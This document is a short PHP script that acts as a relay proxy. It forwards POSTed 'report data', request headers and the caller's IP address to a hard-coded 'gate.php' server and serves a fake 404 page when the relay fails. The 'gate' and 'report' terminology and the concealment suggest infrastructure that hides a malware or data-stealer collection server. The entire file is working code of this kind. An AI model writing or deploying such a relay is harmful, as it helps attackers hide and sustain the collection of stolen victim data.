<?php

$redirect_url = "http://192.168.1.101/gate.php"; // redirect URL (should point to the gate script)






// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);

// check if curl is installed
$loaded_extensions = get_loaded_extensions();

if (array_search('curl', $loaded_extensions) === false)
	die();

// check if data was received in full
$real_length = intval($_SERVER['CONTENT_LENGTH']);
$received_report_data = file_get_contents('php://input');

if ($real_length !== strlen($received_report_data))
	die();

// extract host from redirect url
if (substr($redirect_url, 0, 4) != 'http')
	$redirect_url = 'http://'.$redirect_url;

$redirect_host = @parse_url($redirect_url, PHP_URL_HOST);

function my_upload($ch, $fp, $len)
{
	static $pos=0; // keep track of position
	$post_data = file_get_contents('php://input');

	$data = substr($post_data, $pos, $len);
	$pos += strlen($data);
	return $data;
}

function curl_load($url, &$data, $headers)
{
	clearstatcache();

	$return = false;
	$url = trim($url);

	if (substr($url, 0, 4) != 'http') $url = 'http://'.$url;

	$ch = curl_init($url);
	
	if (!$ch)
		return false;
	
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FAILONERROR, true);
	curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
	curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
	curl_setopt($ch, CURLOPT_POST, true);

	array_push($headers, 'Accept-Encoding: identity, *;q=0');
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$post_data = file_get_contents('php://input');
	if (strlen($post_data))
	{
		curl_setopt($ch, CURLOPT_READFUNCTION, 'my_upload');
	}

	$curl_execute_result = @curl_exec($ch);

	// Check if any error occurred
	if (!curl_errno($ch))
	{
		$data = $curl_execute_result;
		$return = true;
	} else 
	{
		$data = '';
		$return = false;
	}
	curl_close($ch);

	return $return;
}

function parse_lines($value)
{
	return preg_split("/((\r(?!\n))|((?<!\r)\n)|(\r\n))/", $value);
}

$original_query = trim(@parse_url($redirect_url, PHP_URL_QUERY));

if (!strlen($original_query))
	$query_string = '?';
else
	$query_string = '&';

$query_string .= $_SERVER['QUERY_STRING'];
$query_string .= '&pass_ip='.$_SERVER['REMOTE_ADDR'];

$data = '';
$headers = getallheaders();
$curl_headers_array = array();

foreach ($headers as $name=>$value)
{
	if (strtolower($name) == 'accept-encoding' || strtolower($name) == 'connection')
	{
	}
	elseif (strtolower($name) == 'host')
	{
		array_push($curl_headers_array, $name.': '.$redirect_host);
	} else
	{
		array_push($curl_headers_array, $name.': '.$value);
	}
}

if (!curl_load($redirect_url.$query_string, $data, $curl_headers_array))
{
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	$_SERVER['REDIRECT_STATUS'] = 404;
	if (file_exists('404.html'))
		echo file_get_contents('404.html');
	die();
}

$headers_end_pos = strpos($data, "\r\n\r\n");
$data_start_pos = $headers_end_pos+4;
if ($headers_end_pos === false)
{
	$headers_end_pos = strpos($data, "\n\n");
	$data_start_pos = $headers_end_pos+2;
}

if ($headers_end_pos !== false)
{
	$lines = parse_lines(substr($data, 0, $headers_end_pos));
	foreach ($lines as $line)
	{
		// do not pass "Transfer-Encoding: chunked" header
		if (stripos($line, 'Transfer-Encoding') === false)
		{
			header($line."\r\n");
		}
	}

	die(substr($data, $data_start_pos));
} else
{
	die($data);
}

